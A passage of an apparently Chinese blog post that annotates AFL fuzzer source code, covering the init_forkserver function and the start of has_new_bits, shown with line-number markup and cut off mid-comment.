class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Spin up fork server (instrumented mode only). The idea is explained here:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   In essence, the instrumentation allows us to skip execve(), and just keep</span><br><span class="hljs-comment">   cloning a stopped child. So, we just execute once, and then send commands</span><br><span class="hljs-comment">   through a pipe. The other part of this logic is in afl-as.h. */</span><br><br>EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">init_forkserver</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">itimerval</span> <span class="hljs-title">it</span>;</span><br>  <span class="hljs-type">int</span> st_pipe[<span class="hljs-number">2</span>], ctl_pipe[<span class="hljs-number">2</span>];<br>  <span class="hljs-type">int</span> status;<br>  s32 rlen;<br><br>  ACTF(<span class="hljs-string">&quot;Spinning up the fork server...&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (pipe(st_pipe) || pipe(ctl_pipe)) PFATAL(<span class="hljs-string">&quot;pipe() failed&quot;</span>); <span class="hljs-comment">// 创建两个匿名管道</span><br><br>  forksrv_pid = fork(); <span class="hljs-comment">// fork出子进程，返回值为子进程的pid</span><br><br>  <span class="hljs-keyword">if</span> (forksrv_pid &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;fork() failed&quot;</span>);<br>  <br>  <span class="hljs-keyword">if</span> (!forksrv_pid) &#123;     <span class="hljs-comment">/* Child Process */</span><br>    <br>    <span class="hljs-comment">// 针对OpenBSD的特殊处理</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">r</span>;</span><br><br>    <span class="hljs-comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span><br><span class="hljs-comment">       soft 128. Let&#x27;s try to fix that... */</span><br><br>    <span class="hljs-keyword">if</span> (!getrlimit(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="hljs-number">2</span>) &#123;<br><br>      r.rlim_cur = FORKSRV_FD + <span class="hljs-number">2</span>;<br>      setrlimit(RLIMIT_NOFILE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mem_limit) &#123;<br><br>      r.rlim_max = r.rlim_cur = ((<span class="hljs-type">rlim_t</span>)mem_limit) &lt;&lt; <span class="hljs-number">20</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br><br>      setrlimit(RLIMIT_AS, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      <span class="hljs-comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span><br><span class="hljs-comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span><br><span class="hljs-comment">         maps - so we should be getting good protection against OOM bugs. */</span><br><br>      setrlimit(RLIMIT_DATA, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br><br>    &#125;<br><br>    <span class="hljs-comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span><br><span class="hljs-comment">       before the dump is complete. */</span><br><br>    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br><br>    setrlimit(RLIMIT_CORE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    <span class="hljs-comment">/* Isolate the process and configure standard descriptors. If out_file is</span><br><span class="hljs-comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span><br><br>    setsid();   <span class="hljs-comment">// 为子进程创建独立的会话和守护进程，脱离父进程</span><br><br>    dup2(dev_null_fd, <span class="hljs-number">1</span>);       <span class="hljs-comment">// 重定向stdout、stderr到/dev/null</span><br>    dup2(dev_null_fd, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">if</span> (out_file) &#123;     <span class="hljs-comment">// 若out_file不为空</span><br><br>      dup2(dev_null_fd, <span class="hljs-number">0</span>);     <span class="hljs-comment">// 重定向stdin到/dev/null</span><br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      dup2(out_fd, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 重定向stdin到out_fd</span><br>      close(out_fd);<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Set up control and status pipes, close the unneeded original fds. */</span><br><br>    <span class="hljs-keyword">if</span> (dup2(ctl_pipe[<span class="hljs-number">0</span>], FORKSRV_FD) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);     <span class="hljs-comment">// 重定向管道输入到FORKSRV_FD</span><br>    <span class="hljs-keyword">if</span> (dup2(st_pipe[<span class="hljs-number">1</span>], FORKSRV_FD + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);  <span class="hljs-comment">// 定向管道输出到FORKSRV_FD + 1</span><br>    <br>    <span class="hljs-comment">// 关闭不必要的fds，父子进程共享文件描述符fds</span><br>    close(ctl_pipe[<span class="hljs-number">0</span>]); <br>    close(ctl_pipe[<span class="hljs-number">1</span>]);<br>    close(st_pipe[<span class="hljs-number">0</span>]);<br>    close(st_pipe[<span class="hljs-number">1</span>]);<br><br>    close(out_dir_fd);<br>    close(dev_null_fd);<br>    close(dev_urandom_fd);<br>    close(fileno(plot_file));<br><br>    <span class="hljs-comment">/* This should improve performance a bit, since it stops the linker from</span><br><span class="hljs-comment">       doing extra work post-fork(). */</span><br><br>    <span class="hljs-keyword">if</span> (!getenv(<span class="hljs-string">&quot;LD_BIND_LAZY&quot;</span>)) setenv(<span class="hljs-string">&quot;LD_BIND_NOW&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 若未设置环境变量LD_BIND_LAZY，则设置为&quot;1&quot;</span><br><br>    <span class="hljs-comment">/* Set sane defaults for ASAN if nothing else specified. */</span><br><br>    setenv(<span class="hljs-string">&quot;ASAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;detect_leaks=0:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1&quot;</span>, <span class="hljs-number">0</span>);   <span class="hljs-comment">// 设置ASCN相关环境变量</span><br><br>    <span class="hljs-comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span><br><span class="hljs-comment">       point. So, we do this in a very hacky way. */</span><br><br>    setenv(<span class="hljs-string">&quot;MSAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="hljs-string">&quot;:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1:&quot;</span><br>                           <span class="hljs-string">&quot;msan_track_origins=0&quot;</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 设置MSAN相关环境变量</span><br><br>    execv(target_path, argv);   <span class="hljs-comment">// 执行目标程序，该程序作为fork server，若无意外产生，执行到fuzz结束</span><br><br>    <span class="hljs-comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span><br><span class="hljs-comment">       falling through. */</span><br><br>    *(u32*)trace_bits = EXEC_FAIL_SIG;  <span class="hljs-comment">// 设置报错信息</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Close the unneeded endpoints. */</span><br><br>  close(ctl_pipe[<span class="hljs-number">0</span>]);<br>  close(st_pipe[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">/* 管道通信，父进程具有ctl写，具有st读的权限 */</span><br>  fsrv_ctl_fd = ctl_pipe[<span class="hljs-number">1</span>];<br>  fsrv_st_fd  = st_pipe[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span><br>  <span class="hljs-comment">// 等待forkserver启动</span><br>  <br>  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="hljs-number">1000</span>);<br>  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br>  <br>  <span class="hljs-comment">// 从管道中读取fork server状态</span><br>  rlen = read(fsrv_st_fd, &amp;status, <span class="hljs-number">4</span>);<br>  <br>  <span class="hljs-comment">// 关闭定时器</span><br>  it.it_value.tv_sec = <span class="hljs-number">0</span>;<br>  it.it_value.tv_usec = <span class="hljs-number">0</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span><br><span class="hljs-comment">     Otherwise, try to figure out what went wrong. */</span><br>  <span class="hljs-comment">// 若读取成功，标志fork server启动成功</span><br>  <span class="hljs-keyword">if</span> (rlen == <span class="hljs-number">4</span>) &#123;<br>    OKF(<span class="hljs-string">&quot;All right - fork server is up.&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (child_timed_out)  <span class="hljs-comment">// fork server超时</span><br>    FATAL(<span class="hljs-string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (waitpid(forksrv_pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>)    <span class="hljs-comment">// 等待fork server结束，并返回status</span><br>    PFATAL(<span class="hljs-string">&quot;waitpid() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;    <span class="hljs-comment">// 根据status，判断错误原因</span><br><br>    <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! Since it seems to be built with ASAN and you have a\n&quot;</span><br>           <span class="hljs-string">&quot;    restrictive memory limit configured, this is expected; please read\n&quot;</span><br>           <span class="hljs-string">&quot;    %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing the\n&quot;</span><br>           <span class="hljs-string">&quot;      target to hit an OOM condition in the dynamic linker. Try bumping up\n&quot;</span><br>           <span class="hljs-string">&quot;      the limit with the -m setting in the command line. A simple way confirm\n&quot;</span><br>           <span class="hljs-string">&quot;      this diagnosis would be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>           <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>           <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>           <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>           <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>           DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>    &#125;<br><br>    FATAL(<span class="hljs-string">&quot;Fork server crashed with signal %d&quot;</span>, WTERMSIG(status));<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (*(u32*)trace_bits == EXEC_FAIL_SIG)<br>    FATAL(<span class="hljs-string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>           <span class="hljs-string">&quot;    handshake with the injected code. Since it seems to be built with ASAN and\n&quot;</span><br>           <span class="hljs-string">&quot;    you have a restrictive memory limit configured, this is expected; please\n&quot;</span><br>           <span class="hljs-string">&quot;    read %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. Perhaps there is a horrible bug in the\n&quot;</span><br>         <span class="hljs-string">&quot;    fuzzer. Poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. There are %s probable explanations:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;%s&quot;</span><br>         <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing an OOM\n&quot;</span><br>         <span class="hljs-string">&quot;      fault in the dynamic linker. This can be fixed with the -m option. A\n&quot;</span><br>         <span class="hljs-string">&quot;      simple way to confirm the diagnosis may be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>         <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>         <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>         <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>         <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>         <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ? <span class="hljs-string">&quot;three&quot;</span> : <span class="hljs-string">&quot;two&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ?<br>         <span class="hljs-string">&quot;    - You are using deferred forkserver, but __AFL_INIT() is never\n&quot;</span><br>         <span class="hljs-string">&quot;      reached before the program terminates.\n\n&quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>         DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Fork server handshake failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits"></a>has_new_bits</h3><p>检测是否发现了新的路径或者某个路径的执行次数是否不同。</p><p>若发现了新的路径，返回2；若某个路径执行次数不同，返回1；否则返回0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if the current execution path brings anything new to the table.</span><br><span class="hljs-comment">   Update virgin bits to reflect the finds. Returns 1 if the only change is</span><br><span class="hljs-comment">   the hit-count for a particular tuple; 2 if there are new tuples seen. </span><br><span class="hljs-comment">   Updates the map, so subsequent calls will always return 0.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This function is called after every exec() on a fairly large buffer, so</span><br><span class="hljs-comment">   it needs to be fast. We do this in 32-bit and 64-bit flavors. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> u8 <span class="hljs-title function_">has_new_bits</span><span class="hljs-params">(u8* virgin_map)</span> &#123;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WORD_SIZE_64     <span class="hljs-comment">// 64位版本</span></span><br><br>  u64* current = (u64*)trace_bits;<br>  u64* virgin  = (u64*)virgin_map;<br><br>  u32  i = (MAP_SIZE &gt;&gt; <span class="hljs-number">3</span>);<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span>   <span class="hljs-comment">// 32位版本</span></span><br><br>  u32* current = (u32*)trace_bits;<br>  u32* virgin  = (u32*)virgin_map;<br><br>  u32  i = (MAP_SIZE &gt;&gt; <span class="hljs-number">2</span>);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^WORD_SIZE_64 */</span></span><br><br>  u8   ret = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">while</span> (i--) &#123; <span class="hljs-comment">// 循环遍历virgin_bits</span><br><br>    <span class="hljs-comment">/* Optimize for (*current &amp; *virgin) == 0 - i.e., no bits in current bitmap</span><br><span class="hljs-comment">       that have not been already cleared from the virgin map - since this will</span><br><span class="hljs-comment">       almost always be the case. */</span><br>    <br>    <span class="hljs-comment">// 如果current不为0，且current &amp; virgin不为0，即代表current发现了新路径或者某条路径的执行次数和之前有所不同</span><br>    <span class="hljs-keyword">if</span> (unlikely(*current) &amp;&amp; unlikely(*current &amp; *virgin)) &#123;<br><br>      <span class="hljs-keyword">if</span> (likely(ret &lt; <span class="hljs-number">2</span>)) &#123;<br><br>        u8* cur = (u8*)current;<br>        u8* vir = (u8*)virgin;<br><br>        <span class="hljs-comment">/* Looks like we have not found any new bytes yet; see if any non-zero</span><br><span 